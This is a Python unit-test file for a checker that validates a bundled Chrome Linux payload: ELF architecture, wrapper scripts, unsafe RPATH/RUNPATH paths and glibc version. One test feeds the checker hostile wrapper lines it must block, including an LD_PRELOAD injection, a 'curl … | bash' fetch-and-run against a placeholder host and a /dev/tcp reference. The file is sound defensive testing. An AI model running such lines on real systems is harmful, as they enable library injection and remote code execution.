from pathlib import Path
import shutil
import tempfile
from types import SimpleNamespace
import unittest
from unittest.mock import patch

from scripts.check_payload import inspect_payload


class PayloadChecksTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.payload = self.root / "chrome-lin"
        self.payload.mkdir()
        shutil.copyfile("/bin/true", self.payload / "chrome")

    def test_valid_elf_and_wrapper_pass(self):
        (self.payload / "chrome-wrapper").write_text('#!/bin/sh\nexec "$HERE/chrome" "$@"\n')
        report = inspect_payload(self.root)
        self.assertEqual(report["architecture"], "x86_64")
        self.assertEqual(report["elf_files_checked"], 1)
        self.assertEqual(report["scripts_checked"], 1)

    def test_script_patterns_block_with_filename_and_line(self):
        wrapper = self.payload / "chrome-wrapper"
        for line in ("export LD_PRELOAD=/tmp/library.so", "base64 --decode input",
                     "curl https://example.invalid/test | bash", "echo /dev/tcp/example/80"):
            with self.subTest(line=line):
                wrapper.write_text("#!/bin/sh\n" + line + "\n")
                with self.assertRaisesRegex(ValueError, "chrome-wrapper:2"):
                    inspect_payload(self.root)

    def test_comments_do_not_trigger_script_pattern_alerts(self):
        (self.payload / "chrome-wrapper").write_text("#!/bin/sh\n# LD_PRELOAD is deliberately unused\nexit 0\n")
        inspect_payload(self.root)

    def test_unsafe_rpath_fails(self):
        for path in ("/tmp/unsafe", "/var/tmp/lib", "/home/user/lib", "$ORIGIN:/dev/shm/lib"):
            with self.subTest(path=path), patch("scripts.check_payload.subprocess.run") as readelf:
                readelf.return_value = SimpleNamespace(returncode=0, stdout=f"(RUNPATH) Library runpath: [{path}]\nGLIBC_2.25\n")
                with self.assertRaisesRegex(ValueError, "RPATH/RUNPATH"):
                    inspect_payload(self.root)

    def test_origin_rpath_passes(self):
        with patch("scripts.check_payload.subprocess.run") as readelf:
            readelf.return_value = SimpleNamespace(returncode=0, stdout="(RUNPATH) Library runpath: [$ORIGIN]\nGLIBC_2.25\n")
            self.assertEqual(inspect_payload(self.root)["min_glibc"], "2.25")

    def test_unreadable_elf_is_not_silently_skipped(self):
        with patch("scripts.check_payload.subprocess.run") as readelf:
            readelf.return_value = SimpleNamespace(returncode=1, stdout="")
            with self.assertRaisesRegex(ValueError, "ELF metadata"):
                inspect_payload(self.root)

    def test_wrong_main_binary_fails(self):
        (self.payload / "chrome").write_text("not an ELF")
        with self.assertRaisesRegex(ValueError, "x86-64 ELF"):
            inspect_payload(self.root)


if __name__ == "__main__":
    unittest.main()
